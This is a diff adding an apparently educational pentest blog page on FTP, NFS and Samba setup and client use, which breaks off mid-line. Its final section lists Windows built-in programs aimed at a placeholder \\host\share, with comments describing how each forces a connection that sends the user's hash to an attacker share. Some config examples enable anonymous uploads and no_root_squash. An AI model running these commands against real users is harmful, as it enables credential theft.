@@ -1,0 +1,651 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Computer, Network, Security">
+    <meta name="description" content="a blog on Hexo">
+    <meta name="author" content="TyeYeah">
+    
+    <title>
+        
+            Some Network File Sharing Services |
+        
+        Relish the Moment
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/img/wang.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/img/aliwangwang.svg","favicon":"/img/wang.svg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                Relish the Moment
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Some Network File Sharing Services</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/img/aliwangwang.svg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">TyeYeah</span>
+                        
+                            <span class="author-label">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;2020-05-29 15:24:37
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/Penetration-Testing/">Penetration Testing</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pentest/">pentest</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ftp/">ftp</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/smb/">smb</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/cifs/">cifs</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/samba/">samba</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/nfs/">nfs</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>2k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>12 Mins</span>
+        </span>
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h2><p>There are three storage types: </p>
+<ol>
+<li>Direct Attached Storage (DAS)</li>
+<li>Network Attached Storage (NAS)</li>
+<li>Storage Area Network (SAN)</li>
+</ol>
+<h3 id="DAS"><a href="#DAS" class="headerlink" title="DAS"></a>DAS</h3><p><img src="/imghost/snfss/das.png" alt="DAS"><br>Your own destop computer, with a large volumn disk attached, is a kind of Direct Attached Storage. </p>
+<h3 id="NAS"><a href="#NAS" class="headerlink" title="NAS"></a>NAS</h3><p><img src="/imghost/snfss/nas.png" alt="NAS"><br>Now there are many routers that you can plug in external usb storage and then access the storage via LAN network, it is a kind of Network Attached Storage.</p>
+<h3 id="SAN"><a href="#SAN" class="headerlink" title="SAN"></a>SAN</h3><p><img src="/imghost/snfss/san.png" alt="SAN"><br>It uses a special SAN Switch to be the gate of distributed storage device. This is suitable for big business companies.</p>
+<h2 id="File-Transfer-Protocol"><a href="#File-Transfer-Protocol" class="headerlink" title="File Transfer Protocol"></a>File Transfer Protocol</h2><p><code>FTP</code> is a protocol based on C/S, and a dual channel protocol: port 21 for command and port 20 for data connection.</p>
+<p><img src="/imghost/snfss/ftp1.webp" alt="SAN"></p>
+<p>From server side, <code>FTP</code> has two modes.</p>
+<ul>
+<li>PORT style<br>command:    client random port -&gt; server port 21<br>data:       client random port &lt;- server port 20<br>Client port to connect was negotiated in handshake of command tunnel.</li>
+<li>PASV style<br>command:    client random port -&gt; server port 21<br>data:       client random port -&gt; server random port<br>Server port to connect was negotiated in handshake of command tunnel.</li>
+</ul>
+<p>Server command port is always 21. Server data port is fixed in normal.</p>
+<p><img src="/imghost/snfss/ftp2.png" alt="SAN"></p>
+<p>Example: in PASV style you get: <code>227 Entering Passive Mode (172,16,0,1,224,59)</code>, then server port to connect is: <code>224*256+59</code>.</p>
+<h3 id="Softwares"><a href="#Softwares" class="headerlink" title="Softwares"></a>Softwares</h3><p>Server side:</p>
+<ul>
+<li>Wu-ftpd</li>
+<li>Proftpd</li>
+<li>Pureftpd</li>
+<li>Filezilla Server</li>
+<li>Serv-U</li>
+<li>Wing FTP Server</li>
+<li>IIS</li>
+<li>Very Secure FTP Daemon (vsftpd, popular)</li>
+</ul>
+<p>Client side:</p>
+<ul>
+<li>ftp </li>
+<li>lftp</li>
+<li>lftpget</li>
+<li>wget</li>
+<li>curl</li>
+<li>browser</li>
+</ul>
+<h3 id="Very-Secure-FTP-Daemon"><a href="#Very-Secure-FTP-Daemon" class="headerlink" title="Very Secure FTP Daemon"></a>Very Secure FTP Daemon</h3><p><code>vsftp</code> is a relatively popular <code>FTP</code> server program.<br>Service to start:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/lib/systemd/system/vsftpd.service</span><br><span class="line">/etc/rc.d/init.d/vsftpd</span><br></pre></td></tr></table></figure>
+<p>Start the Service:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start vsftpd</span><br></pre></td></tr></table></figure>
+<p>Config file location:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/vsftpd/vsftpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>Configuration items:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># POST style    (windows client as default)</span></span><br><span class="line">connect_from_port_20=YES    <span class="comment"># confirm port 20</span></span><br><span class="line">ftp_data_port=20            <span class="comment"># assign another port rather than 20</span></span><br><span class="line"><span class="comment"># PASV style    (linux client as default)</span></span><br><span class="line">pasv_min_port=6000          <span class="comment"># from 6000</span></span><br><span class="line">pasv_max_port=6010          <span class="comment"># to 6010</span></span><br><span class="line"></span><br><span class="line">use_localtime=YES           <span class="comment"># `No` by default, which is using GMT</span></span><br><span class="line">anonymous_enable=YES        <span class="comment"># `No` by default in CentOS8</span></span><br><span class="line">no_anon_password=YES        <span class="comment"># annoymous need no passwd</span></span><br><span class="line">anon_upload_enable=YES      <span class="comment"># upload priv</span></span><br><span class="line">anon_mkdir_write_enable=YES <span class="comment"># mkdir priv</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Network-File-System"><a href="#Network-File-System" class="headerlink" title="Network File System"></a>Network File System</h2><p>Network File System (<code>NFS</code>) is a distributed file system protocol originally developed by Sun Microsystems (<code>Sun</code>) in 1984, allowing a user on a client computer to access files over a computer network much like local storage is accessed.<br><img src="/imghost/snfss/nfs1.jpg" alt="NFS"><br><code>NFS</code>, like many other protocols, builds on the Open Network Computing Remote Procedure Call (<code>ONC RPC</code>) system, fits C/S architecture.<br><img src="/imghost/snfss/nfs2.jpg" alt="NFS"><br>The <code>NFS</code> is an open standard defined in a Request for Comments (<code>RFC</code>), allowing anyone to implement the protocol.</p>
+<h3 id="Softwares-1"><a href="#Softwares-1" class="headerlink" title="Softwares"></a>Softwares</h3><p>On CentOS (in <code>yum</code> repo) the <code>NFS</code> Utilities package (<code>nfs-utils</code>) contains the userspace server and client tools necessary to use the kernel’s <code>NFS</code> abilities. </p>
+<p>On Ubuntu (in <code>apt</code> repo) we have <code>nfs-kernel-server</code> for server side and <code>nfs-common</code> for client side.</p>
+<h3 id="nfs-utils"><a href="#nfs-utils" class="headerlink" title="nfs-utils"></a><code>nfs-utils</code></h3><p>It is for CentOS.<br>The package is <code>nfs-utils</code>.<br>Related packages are <code>rpcbind</code> (necessary) and <code>tcp_wrappers</code>.<br>Kernel object file needed is <code>nfs.ko</code>.</p>
+<p>Port 2049 is used by <code>nfsd</code>, and other ports assigned by <code>rpcbind</code> (used to be <code>portmap</code>, before CentOS 6)</p>
+<p><code>NFS</code> service process:</p>
+<ul>
+<li>rpc.nfsd      <ul>
+<li>Most important <code>NFS</code> process, manage whether the client can log in</li>
+</ul>
+</li>
+<li>rpc.mountd <ul>
+<li>Mount and unmount <code>NFS</code>, including permission/privilege management</li>
+</ul>
+</li>
+<li>rpc.lockd <ul>
+<li>Non-essential, manage file locks to avoid simultaneous write errors</li>
+</ul>
+</li>
+<li>rpc.statd <ul>
+<li>Non-essential, check file consistency, repair broken file</li>
+</ul>
+</li>
+</ul>
+<p>Logs in <code>/var/lib/nfs/</code>, and configurations are <code>/etc/exports</code> and <code>/etc/exports.d/*.exports</code>.</p>
+<p>Format of config files:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/dir    host1(opt1,opt2)    host2(opt1,opt2) ...     </span><br><span class="line"># assign &#x27;/dir&#x27; to host1, host2 and ...</span><br><span class="line"># &#x27;host&#x27; can be ipv4, ipv6, FQDN (Fully Qualified Domain Name) like:</span><br><span class="line">    172.18.0.0/255.255.0.0</span><br><span class="line">    172.18.0.0/16</span><br><span class="line">    www.domain.com</span><br><span class="line">    *.domain.com</span><br><span class="line"># &#x27;opt&#x27; can be default(ro,sync,root_squash,no_all_squash) and more:</span><br><span class="line">    ro,rw   -- read-only and read-write</span><br><span class="line">    async   -- asynchronous, not write immediately, high performance</span><br><span class="line">    sync    -- synchronization, write immediately after data changing</span><br><span class="line">    root_squash    -- Remote root mapping is nfsnobody/nobody, UID 65534</span><br><span class="line">    no_root_squash -- Remote root mapped as root user, without authority squeezed</span><br><span class="line">    all_squash     -- all remote users become nfsnobody/nobody</span><br><span class="line">    no_all_squash  -- retain the UID and GID of shared files</span><br><span class="line">    anonuid and anongid --  indicate that anonymous users are mapped to specific user UIDs and group GIDs instead of nfsnobody, which can be used with all_squash</span><br></pre></td></tr></table></figure>
+<p>Some <code>NFS</code> related tools:</p>
+<ol>
+<li><code>rpcinfo</code>: see <code>RPC</code> information<ul>
+<li>-p [hostname]     see port list</li>
+<li>-s [hostname]     see registered programs</li>
+</ul>
+</li>
+<li><code>exportfs</code>: manage <code>NFS</code><ul>
+<li>-v    see all local <code>NFS</code> shares</li>
+<li>-r    reread config files, and share dirs</li>
+<li>-a    output all local shares, resume all suspended shares</li>
+<li>-au   stop all local sharing</li>
+</ul>
+</li>
+<li><code>showmount</code><ul>
+<li>-e [hostname]     print shared file list</li>
+</ul>
+</li>
+<li><code>autofs</code>:    service for auto mount<ul>
+<li>package: <code>autofs</code></li>
+<li>service: <code>/usr/lib/systemd/system/autofs.service</code></li>
+<li>config file in <code>/etc/auto.master</code></li>
+</ul>
+</li>
+<li><code>mount.nfs</code>: also for auto mount<ul>
+<li>config file in <code>/etc/fstab</code></li>
+</ul>
+</li>
+</ol>
+<p>For mounting, there are some parameters:</p>
+<ul>
+<li>fg:   Mount at the front</li>
+<li>bg:   Mount in the background</li>
+<li>hard: Persistent mounting request</li>
+<li>soft: Non-persistent request</li>
+<li>intr: Work with ‘hard’, means can be interupted by <code>ctrl+c</code></li>
+<li>rsize/wsize:  Maximum number of bytes to read and write data at a time, rsize = 32768</li>
+<li>_netdev:  No mounting without network</li>
+</ul>
+<p>We can mount manually:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o rw,nosuid,<span class="built_in">fg</span>,hard,intr x.x.x.x:/testdir /mnt/nfs/</span><br></pre></td></tr></table></figure>
+<p>Or automatically:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/fstab</span><br><span class="line">x.x.x.x:/public /mnt/nfs nfs defaults,_netdev 0 0</span><br></pre></td></tr></table></figure>
+
+<p>Using example:<br>Start service at server side. </p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir /data/share1</span><br><span class="line">$ mkdir /data/share2</span><br><span class="line">$ touch /data/share1/share1.txt</span><br><span class="line">$ touch /data/share2/share2.txt</span><br><span class="line">$ vim /etc/exports</span><br><span class="line">$ cat /etc/exports</span><br><span class="line">/data/share1/ *</span><br><span class="line">$ vim /etc/exports.d/test.exports</span><br><span class="line">$ cat /etc/exports.d/test.exports </span><br><span class="line">/data/share2 *</span><br><span class="line">$ exportfs -v</span><br><span class="line">$ exportfs -r</span><br><span class="line">exportfs: No options <span class="keyword">for</span> /data/share1/ *: suggest *(sync) to avoid warning</span><br><span class="line">exportfs: No options <span class="keyword">for</span> /data/share2 *: suggest *(sync) to avoid warning</span><br><span class="line">$ exportfs -v</span><br><span class="line">/data/share1  	&lt;world&gt;(sync,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)</span><br><span class="line">/data/share2  	&lt;world&gt;(sync,wdelay,hide,no_subtree_check,sec=sys,ro,secure,root_squash,no_all_squash)</span><br></pre></td></tr></table></figure>
+<p>See sharing files and mount <code>NFS</code> dicks at client side.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ showmount -e nfs_server_ip</span><br><span class="line">Export list <span class="keyword">for</span> nfs_server_ip:</span><br><span class="line">/data/share2 *             </span><br><span class="line">/data/share1 *</span><br><span class="line">$</span><br><span class="line">$ mkdir /mnt/nfs1</span><br><span class="line">$ mount nfs_server_ip:/data/share1 /mnt/nfs1</span><br><span class="line">$ ls /mnt/nfs1/</span><br><span class="line">share1.txt</span><br></pre></td></tr></table></figure>
+<p>Examples for <code>NFS</code> config.</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/exports</span><br><span class="line">/myshare server.example.com</span><br><span class="line">/myshare *.example.com</span><br><span class="line">/myshare server?.example.com</span><br><span class="line">/myshare server[0-20].example.com</span><br><span class="line">/myshare 172.25.11.10</span><br><span class="line">/myshare 172.25.0.0/16</span><br><span class="line">/myshare 2000:472:18:b51:c32:a21</span><br><span class="line">/myshare 2000:472:18:b51::/64</span><br><span class="line">/myshare *.example.com 172.25.0.0/16</span><br><span class="line">/myshare desktop.example.com(ro)</span><br><span class="line">/myshare desktop.example.com(ro) server[0-20].example.com(rw)</span><br><span class="line">/myshare diskless.example.com(rw,no_root_squash)</span><br><span class="line"></span><br><span class="line">$ vim /etc/exports.d/test.exports</span><br><span class="line">/data/share2 * 192.168.32.0/24(ro) 192.168.32.7(rw)</span><br></pre></td></tr></table></figure>
+
+<h3 id="nfs-kernel-server-and-nfs-common"><a href="#nfs-kernel-server-and-nfs-common" class="headerlink" title="nfs-kernel-server and nfs-common"></a><code>nfs-kernel-server</code> and <code>nfs-common</code></h3><p>Configurations and usage are the same as <code>nfs-utils</code>, see <a class="link"   target="_blank" rel="noopener" href="https://www.digitalocean.com/community/tutorials/how-to-set-up-an-nfs-mount-on-ubuntu-18-04" >this link<i class="fas fa-external-link-alt"></i></a> for the details.</p>
+<h2 id="Samba"><a href="#Samba" class="headerlink" title="Samba"></a>Samba</h2><p>What is <code>Samba</code>? A collection of different applications with when used together let a Linux server perform network actions like file serving, authentication/authorization, name resolution and print services.</p>
+<p>Like <code>CIFS</code>, Samba implements the <code>SMB</code> protocol which is what allows Windows clients to transparently access Linux directories, printers and files on a Samba server (just as if they were talking to a Windows server).</p>
+<p>Crucially, <code>Samba</code> allows for a Linux server to act as a <code>Domain Controller</code>. By doing so, user credentials on the Windows <code>Domain</code> can be used instead of needing to be recreated and then manually kept in sync on the Linux server.</p>
+<h3 id="Server-Message-Block"><a href="#Server-Message-Block" class="headerlink" title="Server Message Block"></a>Server Message Block</h3><p>The Server Message Block (<code>SMB</code>) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. </p>
+<p>Using the <code>SMB</code> protocol, an application (or the user of an application) can access files or other resources at a remote server. </p>
+<h3 id="Common-Internet-File-System"><a href="#Common-Internet-File-System" class="headerlink" title="Common Internet File System"></a>Common Internet File System</h3><p><code>CIFS</code> stands for “Common Internet File System.”, which is a dialect of <code>SMB</code>, is a particular implementation of the Server Message Block protocol, created by Microsoft.</p>
+<p><code>CIFS</code> and <code>SMB</code> are interchangeable not only in a discussion but also in application – i.e., a client speaking <code>CIFS</code> can talk to a server speaking <code>SMB</code> and vice versa because <code>CIFS</code> is a form of <code>SMB</code>.</p>
+<p>While they are the same top level protocol, there are still differences in implementation and performance tuning (hence the different names). Protocol implementations like CIFS vs SMB often handle things like file locking, performance over LAN/WAN, and mass modification of file differently.</p>
+<p>But, in this day and age, you should always use the acronym SMB.</p>
+<p>Two reasons:</p>
+<ol>
+<li><p>The <code>CIFS</code> implementation of <code>SMB</code> is rarely used these days. Under the covers, most modern storage systems no longer use <code>CIFS</code>, they use <code>SMB</code> v2 or <code>SMB</code> v3. In the Windows world, <code>SMB</code> v2 has been the standard as of Windows Vista (2006) and <code>SMB</code> v3 is part of Windows 8 and Windows Server 2012.</p>
+</li>
+<li><p><code>CIFS</code> has a negative connotation amongst pedants. <code>SMB</code> v2 and <code>SMB</code> v3 are massive upgrades over the <code>CIFS</code> dialect, and storage architects who are near and dear to file sharing protocols don’t appreciate the misnomer. It’s kind of like calling an executive assistant a secretary.</p>
+</li>
+</ol>
+<h3 id="Softwares-2"><a href="#Softwares-2" class="headerlink" title="Softwares"></a>Softwares</h3><p>Packages:</p>
+<ul>
+<li>samba:  Provide <code>SMB</code> service</li>
+<li>samba-client:   Client</li>
+<li>samba-common:   General tools</li>
+<li>cifs-utils:     Client tools</li>
+<li>samba-winbind:  Related to <code>AD</code></li>
+</ul>
+<p>Services:</p>
+<ul>
+<li>smbd: Provide <code>SMB</code> (<code>CIFS</code>) service, TCP:139,445</li>
+<li>nmbd: <code>NetBIOS</code> name resolution, UDP:137,138</li>
+</ul>
+<p>Configuration file: <code>/etc/samba/smb.conf</code><br>Grammar check:  testparm [-v] [/etc/samba/smb.conf]<br>Client softwares:   <code>smbclient</code>, <code>mount.cifs</code></p>
+<h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>Server side:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ systemctl start smb <span class="comment"># start smbd</span></span><br><span class="line">$ systemctl start nmb <span class="comment"># start nmbd</span></span><br></pre></td></tr></table></figure>
+
+<p>Client side:<br>Universal Naming Convention (<code>UNC</code>) goes like:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\sambaserver\sharename</span><br><span class="line"><span class="comment"># &#x27;sambaserver&#x27; can be domain name or ip address </span></span><br></pre></td></tr></table></figure>
+<p>Use <code>smbclient</code> to access:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ smbclient -L instructor.example.com</span><br><span class="line">$ smbclient -L instructor.example.com -U smb_user</span><br><span class="line"><span class="comment"># &#x27;-U&#x27; to assign user%password, or set environment variables: USER and PASSWD</span></span><br><span class="line">$ smbclient //instructor.example.com/shared -U username</span><br><span class="line">&gt;<span class="built_in">cd</span> directory</span><br><span class="line">&gt;get file1</span><br><span class="line">&gt;put file2</span><br></pre></td></tr></table></figure>
+<p>Mount <code>CIFS</code> file system:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o user=username,password=passwd //server/shared /mnt/smb</span><br></pre></td></tr></table></figure>
+<p>Automatically mount at boot:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/fstab</span><br><span class="line">//server/homes /mnt cifs credentials</span><br><span class="line"><span class="comment"># or use file to replace username &amp; password input</span></span><br><span class="line">cred=/etc/smb.txt 0 0</span><br><span class="line"></span><br><span class="line">$ cat /etc/smb.txt</span><br><span class="line">username=wang     <span class="comment">#或 user=wang</span></span><br><span class="line">password=password <span class="comment">#或 pass=password</span></span><br><span class="line">chmod 600 /etc/smb.txt       <span class="comment">#这一步加密很重要</span></span><br></pre></td></tr></table></figure>
+
+<p>On Windows we have a lot of tools to use:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">net.exe use \\host\share</span><br><span class="line">attrib.exe \\host\share</span><br><span class="line">bcdboot.exe \\host\share</span><br><span class="line">bdeunlock.exe \\host\share</span><br><span class="line">cacls.exe \\host\share</span><br><span class="line">certreq.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">certutil.exe \\host\share</span><br><span class="line">cipher.exe \\host\share</span><br><span class="line">ClipUp.exe <span class="literal">-l</span> \\host\share</span><br><span class="line">cmdl32.exe \\host\share</span><br><span class="line">cmstp.exe /s \\host\share</span><br><span class="line">colorcpl.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">comp.exe /N=<span class="number">0</span> \\host\share \\host\share</span><br><span class="line">compact.exe \\host\share</span><br><span class="line">control.exe \\host\share</span><br><span class="line">convertvhd.exe <span class="literal">-source</span> \\host\share <span class="literal">-destination</span> \\host\share</span><br><span class="line">Defrag.exe \\host\share</span><br><span class="line">DeployUtil.exe /install \\host\share</span><br><span class="line">DevToolsLauncher.exe GetFileListing \\host\share <span class="comment">#(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)</span></span><br><span class="line">diskperf.exe \\host\share</span><br><span class="line">dispdiag.exe <span class="literal">-out</span> \\host\share</span><br><span class="line">doskey.exe /MACROFILE=\\host\share</span><br><span class="line">esentutl.exe /k \\host\share</span><br><span class="line">expand.exe \\host\share</span><br><span class="line">extrac32.exe \\host\share</span><br><span class="line">FileHistory.exe \\host\share <span class="comment">#(noisy, pops a gui)</span></span><br><span class="line">findstr.exe * \\host\share</span><br><span class="line">fontview.exe \\host\share <span class="comment">#(noisy, pops an error dialog)</span></span><br><span class="line">fvenotify.exe \\host\share <span class="comment">#(noisy, pops an access denied error)</span></span><br><span class="line">FXSCOVER.exe \\host\share <span class="comment">#(noisy, pops GUI)</span></span><br><span class="line">hwrcomp.exe <span class="literal">-check</span> \\host\share</span><br><span class="line">hwrreg.exe \\host\share</span><br><span class="line">icacls.exe \\host\share</span><br><span class="line">LaunchWinApp.exe \\host\share <span class="comment">#(noisy, will pop an explorer window with the  contents of your SMB share.)</span></span><br><span class="line">licensingdiag.exe <span class="literal">-cab</span> \\host\share</span><br><span class="line">lodctr.exe \\host\share</span><br><span class="line">lpksetup.exe /p \\host\share /s</span><br><span class="line">makecab.exe \\host\share</span><br><span class="line">MdmDiagnosticsTool.exe <span class="literal">-out</span> \\host\share <span class="comment">#(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span></span><br><span class="line">mshta.exe \\host\share <span class="comment">#(noisy, pops an HTA window)</span></span><br><span class="line">msiexec.exe /update \\host\share /quiet</span><br><span class="line">msinfo32.exe \\host\share <span class="comment">#(noisy, pops a &quot;cannot open&quot; dialog)</span></span><br><span class="line">mspaint.exe \\host\share <span class="comment">#(noisy, invalid path to png 